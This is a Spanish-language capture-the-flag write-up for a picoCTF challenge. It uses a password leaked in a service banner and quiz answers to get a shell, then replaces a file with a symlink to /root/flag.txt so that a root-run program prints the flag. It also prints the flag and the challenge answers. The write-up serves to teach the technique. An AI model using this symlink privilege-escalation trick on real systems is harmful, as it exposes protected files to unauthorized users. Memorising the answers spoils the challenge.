# dont-you-love-banners

## Descripción del Reto

Este reto de nivel medio (300 puntos) pertenece a la categoría **General Skills** y combina conceptos de **enumeración de servicios**, **filtración de credenciales**, **autenticación interactiva** y **abuso de enlaces simbólicos (symlinks)** en sistemas Linux.

El objetivo consiste en aprovechar información filtrada por un servicio expuesto, acceder a una shell restringida y manipular un archivo utilizado por la aplicación para lograr que el sistema revele una bandera almacenada en un directorio privilegiado (`/root`).

---

## Reconocimiento Inicial

El reto proporciona dos servicios:

```bash
nc tethys.picoctf.net 53227
```

```bash
nc tethys.picoctf.net 62386
```

Al conectarse al primer puerto se observa una filtración accidental de credenciales:

```text
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

La contraseña expuesta era:

```text
My_Passw@rd_@1234
```

Esta información resulta fundamental para acceder al segundo servicio.

---

## Acceso al Sistema

Al conectarse al segundo puerto:

```bash
nc tethys.picoctf.net 62386
```

el sistema solicita varias respuestas de autenticación.

### Contraseña

```text
My_Passw@rd_@1234
```

### Conferencia de ciberseguridad

```text
DEF CON
```

### Primer hacker famoso por el phreaking

```text
John Draper
```

Tras responder correctamente se obtiene acceso a una shell:

```bash
player@challenge:~$
```

---

## Enumeración del Entorno

Se inspeccionaron los archivos disponibles:

```bash
ls -la
```

Resultado:

```text
-rw-r--r-- 1 player player 114 Feb  7  2024 banner
-rw-r--r-- 1 root   root    13 Feb  7  2024 text
```

Contenido de los archivos:

```bash
cat banner
```

```text
*************************************
**************WELCOME****************
*************************************
```

```bash
cat text
```

```text
keep digging
```

La pista del reto menciona explícitamente el uso de **symlinks**, indicando que el archivo `banner` probablemente sea utilizado por la aplicación para mostrar información al usuario.

---

## Explotación mediante Symlink

Se eliminó el archivo original:

```bash
rm banner
```

Y se creó un enlace simbólico apuntando a la bandera:

```bash
ln -s /root/flag.txt banner
```

Verificación:

```bash
ls -l
```

Resultado:

```text
lrwxrwxrwx 1 player player 14 Jun 15 02:22 banner -> /root/flag.txt
```

Con esto, cualquier proceso que intente leer `banner` terminará leyendo realmente `/root/flag.txt`.

---

## Obtención de la Flag

Al salir de la sesión o provocar que la aplicación vuelva a leer el contenido de `banner`, el programa siguió el enlace simbólico y mostró el contenido del archivo protegido.

### Flag Obtenida

```text
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```


